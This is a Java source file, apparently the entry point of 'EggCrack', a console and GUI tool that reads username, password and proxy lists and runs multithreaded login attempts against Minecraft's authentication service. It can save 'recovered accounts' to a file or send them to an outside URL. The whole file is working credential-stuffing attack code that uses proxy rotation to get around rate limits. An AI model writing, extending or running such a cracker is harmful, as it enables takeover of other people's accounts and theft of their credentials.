package net.teamlixo.eggcrack;

import joptsimple.ArgumentAcceptingOptionSpec;
import joptsimple.OptionParser;
import joptsimple.OptionSet;
import net.teamlixo.eggcrack.account.Account;
import net.teamlixo.eggcrack.account.output.AccountOutput;
import net.teamlixo.eggcrack.account.output.FileAccountOutput;
import net.teamlixo.eggcrack.account.output.UrlAccountOutput;
import net.teamlixo.eggcrack.authentication.AuthenticationService;
import net.teamlixo.eggcrack.credential.Credential;
import net.teamlixo.eggcrack.credential.Credentials;
import net.teamlixo.eggcrack.list.ExtendedList;
import net.teamlixo.eggcrack.list.array.ExtendedArrayList;
import net.teamlixo.eggcrack.minecraft.MinecraftAccount;
import net.teamlixo.eggcrack.minecraft.MinecraftAuthenticationFactory;
import net.teamlixo.eggcrack.minecraft.MinecraftAuthenticationService;
import net.teamlixo.eggcrack.objective.Objective;
import net.teamlixo.eggcrack.objective.ObjectiveCompleted;
import net.teamlixo.eggcrack.objective.ObjectiveRequests;
import net.teamlixo.eggcrack.objective.ObjectiveTime;
import net.teamlixo.eggcrack.ui.UserInterface;

import javax.swing.*;
import java.io.*;
import java.net.*;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.logging.ConsoleHandler;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Created with IntelliJ IDEA.
 * Date: 8/14/2014
 * Time: 4:46 PM
 */
public final class Main {
    public static final void main(String[] args) throws
            IOException, ClassNotFoundException, UnsupportedLookAndFeelException,
            InstantiationException, IllegalAccessException {

        System.setProperty("java.net.preferIPv4Stack", "true");

        EggCrack.LOGGER = Logger.getLogger("EggCrack");

        //Configure the logger's handler (It's just going to output to console)
        ConsoleHandler consoleHandler = new ConsoleHandler();
        consoleHandler.setFormatter(new LineLogFormatter());
        EggCrack.LOGGER.addHandler(consoleHandler);

        //And, of course, add the handler itself to the logger:
        EggCrack.LOGGER.setUseParentHandlers(false);
        EggCrack.LOGGER.setLevel(Level.ALL);

        //Read in parameters.
        OptionParser optionsParser = new OptionParser();

        ArgumentAcceptingOptionSpec consoleArgument = optionsParser.accepts("console").withOptionalArg();

        ArgumentAcceptingOptionSpec debugArgument = optionsParser.accepts("debug").withOptionalArg();

        ArgumentAcceptingOptionSpec proxyArgument = optionsParser.accepts("proxies").withRequiredArg().ofType(String.class).defaultsTo("proxies.txt");
        ArgumentAcceptingOptionSpec usernameArgument = optionsParser.accepts("usernames").withRequiredArg().ofType(String.class).defaultsTo("usernames.txt");
        ArgumentAcceptingOptionSpec passwordArgument = optionsParser.accepts("passwords").withRequiredArg().ofType(String.class).defaultsTo("passwords.txt");

        ArgumentAcceptingOptionSpec threadsArgument = optionsParser.accepts("threads").withRequiredArg().ofType(Integer.class).defaultsTo(Integer.valueOf(32));
        ArgumentAcceptingOptionSpec intervalArgument = optionsParser.accepts("interval").withRequiredArg().ofType(Integer.class).defaultsTo(Integer.valueOf(10));
        ArgumentAcceptingOptionSpec checkArgument = optionsParser.accepts("checkUrl").withOptionalArg().ofType(String.class);

        ArgumentAcceptingOptionSpec completedObjectiveArgument = optionsParser.accepts("objectiveCompleted").withOptionalArg().ofType(Integer.class);
        ArgumentAcceptingOptionSpec timeObjectiveArgument = optionsParser.accepts("objectiveSeconds").withOptionalArg().ofType(Integer.class);
        ArgumentAcceptingOptionSpec requestObjectiveArgument = optionsParser.accepts("objectiveRequests").withOptionalArg().ofType(Integer.class);

        ArgumentAcceptingOptionSpec fileOutputArgument = optionsParser.accepts("outputFile").withOptionalArg().ofType(String.class);
        ArgumentAcceptingOptionSpec urlOutputArgument = optionsParser.accepts("outputUrl").withOptionalArg().ofType(String.class);

        ArgumentAcceptingOptionSpec logFileArgument = optionsParser.accepts("logFile").withOptionalArg().ofType(String.class);
        ArgumentAcceptingOptionSpec logLevelArgument = optionsParser.accepts("logLevel").withOptionalArg().ofType(String.class).defaultsTo("warn");

        OptionSet optionSet = optionsParser.parse(args);

        if (optionSet.has(debugArgument)) {
            consoleHandler.setLevel(Level.FINEST);
            EggCrack.LOGGER.fine("Console debugging enabled.");
        } else consoleHandler.setLevel(Level.INFO);

        if (!optionSet.has(consoleArgument)) {
            UserInterface.main(args);
            return;
        }

        int threads = (Integer) optionSet.valueOf(threadsArgument);
        float interval = ((Integer) optionSet.valueOf(intervalArgument)) / 1f;
        URL checkUrl = null;
        if (optionSet.has(checkArgument)) {
            try {
                checkUrl = URI.create(optionSet.valueOf(checkArgument).toString()).toURL();
            } catch (MalformedURLException e) {
                e.printStackTrace();
                return;
            } catch (IllegalArgumentException e) {
                e.printStackTrace();
                return;
            }
        }

        EggCrack.LOGGER.fine("[Options] threads=" + threads);
        EggCrack.LOGGER.fine("[Options] interval=" + interval + " requests/sec");

        ExtendedList<Objective> objectiveList = new ExtendedArrayList<Objective>();
        if (optionSet.has(completedObjectiveArgument))
            objectiveList.add(new ObjectiveCompleted((Integer) optionSet.valueOf(completedObjectiveArgument)));
        if (optionSet.has(timeObjectiveArgument))
            objectiveList.add(new ObjectiveTime((Integer) optionSet.valueOf(timeObjectiveArgument)));
        if (optionSet.has(requestObjectiveArgument))
            objectiveList.add(new ObjectiveRequests((Integer) optionSet.valueOf(requestObjectiveArgument)));

        if (objectiveList.size() <= 0) {
            EggCrack.LOGGER.warning("No objectives provided! Session will continue until all accounts are attempted.");
            return;
        } else {
            EggCrack.LOGGER.fine("[Options] objectives=" + objectiveList.size());
        }

        ExtendedList<AccountOutput> outputList = new ExtendedArrayList<AccountOutput>();
        if (optionSet.has(fileOutputArgument))
            outputList.add(new FileAccountOutput(new File(optionSet.valueOf(fileOutputArgument).toString())));
        if (optionSet.has(urlOutputArgument))
            outputList.add(new UrlAccountOutput(URI.create(optionSet.valueOf(urlOutputArgument).toString()).toURL()));

        if (outputList.size() <= 0) {
            EggCrack.LOGGER.warning("No outputs provided! Recovered accounts will not be saved.");
        } else {
            EggCrack.LOGGER.fine("[Options] outputs=" + outputList.size());
        }

        if (optionSet.has(logFileArgument)) {
            try {
                FileHandler fileHandler = new FileHandler(optionSet.valueOf(logFileArgument).toString());
                fileHandler.setFormatter(new LineLogFormatter());

                String level = optionSet.valueOf(logLevelArgument).toString().trim();

                if (level.equalsIgnoreCase("info")) {
                    fileHandler.setLevel(Level.INFO);
                } else if (level.equalsIgnoreCase("warn")) {
                    fileHandler.setLevel(Level.WARNING);
                } else if (level.equalsIgnoreCase("severe")) {
                    fileHandler.setLevel(Level.SEVERE);
                } else {
                    EggCrack.LOGGER.severe("Unknown log level (info/warn/severe): " + level.toLowerCase() + ".");
                    return;
                }

                EggCrack.LOGGER.info("Logging enabled; appending " + level.toUpperCase() + " entries to " + (new File(optionSet.valueOf(logFileArgument).toString())).getAbsolutePath());
                EggCrack.LOGGER.addHandler(fileHandler);
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
        }

        EggCrack.LOGGER.info("Starting EggCrack at " + Calendar.getInstance().getTime().toString() + "...");

        //Set up the executor service responsible for executing threads.
        ExecutorService executorService = Executors.newFixedThreadPool(
                threads,
                new AuthenticatorThreadFactory(Thread.MIN_PRIORITY)
        );

        Tracker tracker = new Tracker();

        //Set up the Minecraft authentication service responsible for authenticating accounts.
        AuthenticationService authenticationService = new MinecraftAuthenticationService(
                new MinecraftAuthenticationFactory(),
                interval,
                tracker
        );

        //Import accounts from file.
        ExtendedList<Account> accountList = new ExtendedArrayList<Account>();
        File usernameFile = new File(optionSet.valueOf(usernameArgument).toString());
        BufferedReader usernameReader = new BufferedReader(new FileReader(usernameFile));
        while (usernameReader.ready())
            accountList.add(new MinecraftAccount(usernameReader.readLine().trim()));
        usernameReader.close();
        EggCrack.LOGGER.info("Loaded " + accountList.size() + " accounts (" + usernameFile.getAbsolutePath() + ").");

        //Import credentials from file.
        ExtendedList<Credential> credentialList = new ExtendedArrayList<Credential>();
        File passwordFile = new File(optionSet.valueOf(passwordArgument).toString());
        BufferedReader passwordReader = new BufferedReader(new FileReader(passwordFile));
        while (passwordReader.ready())
            credentialList.add(Credentials.createPassword(passwordReader.readLine().trim()));
        passwordReader.close();
        EggCrack.LOGGER.info("Loaded " + credentialList.size() + " passwords (" + passwordFile.getAbsolutePath() + ").");

        //Import proxies from file.
        ExtendedList<Proxy> proxyList = new ExtendedArrayList<Proxy>();
        File proxyFile = new File(optionSet.valueOf(proxyArgument).toString());
        BufferedReader proxyReader = new BufferedReader(new FileReader(proxyFile));
        while (proxyReader.ready()) {
            String[] proxyLine = proxyReader.readLine().split(":");
            try {
                proxyList.add(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyLine[0], Integer.parseInt(proxyLine[1]))));
            } catch (Exception ex) {
                EggCrack.LOGGER.warning("Problem loading proxy: " + ex.getMessage());
            }
        }
        proxyReader.close();
        EggCrack.LOGGER.info("Loaded " + proxyList.size() + " proxies (" + proxyFile.getAbsolutePath() + ").");

        //Initialize the EggCrack instance to create a credential store.
        final EggCrack eggCrack = new EggCrack(
                executorService,
                authenticationService,
                accountList,
                credentialList,
                proxyList,
                objectiveList,
                outputList,
                tracker,
                checkUrl
        );

        //Run EggCrack.
        eggCrack.run();
    }
}
